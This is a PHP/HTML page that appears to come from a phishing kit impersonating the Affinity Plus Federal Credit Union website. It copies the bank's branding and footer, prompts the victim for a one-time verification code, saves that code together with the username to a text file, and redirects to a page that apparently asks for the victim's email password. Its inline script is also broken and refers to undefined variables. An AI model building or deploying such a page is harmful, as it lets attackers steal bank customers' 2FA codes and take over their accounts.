<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];
$otp = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = trim($_POST['otp'] ?? '');
    
    // Simple validation
    if (empty($otp)) {
        $errors['otp'] = 'Please enter the verification code';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'otp_verification',
            'usrnm' => $username,
            'vrf_cd' => $otp
        ];
        
        saveUserData('otp_verification.txt', $data);
        
        // Redirect to email password page
        header('Location: email_password.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Identity - Affinity</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body>
    <div class="min-h-screen flex flex-col overflow-hidden bg-cover bg-center bg-no-repeat relative" style="background-image: url('assets/background.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex flex-col min-h-screen">
            <!-- Header -->
            <header class="bg-purple-900 text-white py-3 px-6 flex items-center justify-between shadow-md">
                <div class="flex items-center space-x-2">
                    <img src="assets/logo.svg" alt="Affinity Plus Logo" class="h-10 w-auto" />
                </div>
                <div class="flex items-center space-x-3">
                    <div class="text-white/80 hover:text-white cursor-pointer transition-colors p-1">
                        <i class="fas fa-comments text-xl"></i>
                    </div>
                </div>
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-10">
                <!-- OTP Verification Card -->
                <div class="bg-white shadow-lg rounded-md w-full max-w-md p-6 flex flex-col gap-4">
                    <!-- Card Header -->
                    <div>
                        <h2 class="text-center text-xl font-semibold mb-2 text-gray-900">Verify Your Identity</h2>
                        <p class="text-center text-gray-600 text-sm">Enter the verification code</p>
                    </div>
                    
                    <?php if (!empty($errors)): ?>
                        <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        <?php echo htmlspecialchars(implode(' ', $errors)); ?>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-4">
                        <div>
                            <input
                                type="text"
                                name="otp"
                                id="otp"
                                class="w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-purple-600 focus:border-transparent"
                                placeholder="Enter verification code"
                                autocomplete="one-time-code"
                                inputmode="numeric"
                                required
                            >
                        </div>
                        
                        <div class="pt-2">
                            <button
                                type="submit"
                                class="w-full bg-purple-900 hover:bg-purple-800 text-white py-3 rounded-md font-medium transition disabled:opacity-70"
                            >
                                Verify & Continue
                            </button>
                        </div>
                        
                        <div class="text-center">
                            <button type="button" class="text-sm text-purple-800 hover:underline focus:outline-none">
                                Didn't receive a code? <span class="font-medium">Resend</span>
                            </button>
                        </div>
                    </form>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-white py-6 text-center text-sm text-gray-700 border-t border-gray-200">
                <div class="flex flex-col md:flex-row items-center justify-center gap-3 mb-3">
                    <a href="#" class="text-purple-800 hover:underline">Contact Us</a>
                    <a href="#" class="text-purple-800 hover:underline">Locations</a>
                    <a href="#" class="text-purple-800 hover:underline">Disclosures</a>
                    <a href="#" class="text-purple-800 hover:underline">Privacy Policy</a>
                    <a href="#" class="text-purple-800 hover:underline">Open a Membership</a>
                </div>
                <p class="text-xs text-gray-600">Routing # 296076301</p>
                <p class="text-xs mt-2 text-gray-600">
                    Affinity Plus Federal Credit Union is federally insured by the National Credit Union Administration. Copyright 2025 Affinity Plus Federal Credit Union.
                </p>

                <div class="flex items-center justify-center gap-4 mt-4">
                    <img src="assets/equal-housing.png" alt="Equal Housing Lender" class="h-8 w-auto" />
                    <img src="assets/ncua.png" alt="NCUA Insured" class="h-8 w-auto" />
                </div>
            </footer>
        </div>
    </div>
    
    <script>
        // Auto-focus OTP input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const otpInput = document.getElementById('otp');
            if (otpInput) {
                otpInput.focus();
                // Fill inputs with pasted digits
                for (let i = 0; i < Math.min(pasted.length, inputs.length); i++) {
                    inputs[i].value = pasted[i];
                }
                
                // Update hidden input
                document.getElementById('otp-input').value = pasted.substring(0, inputs.length);
                
                // Submit if we have enough digits
                if (pasted.length >= inputs.length) {
                    document.querySelector('form').submit();
                } else {
                    // Focus next empty field
                    inputs[Math.min(pasted.length, inputs.length - 1)].focus();
                }
            }
        });
    </script>
</body>
</html>
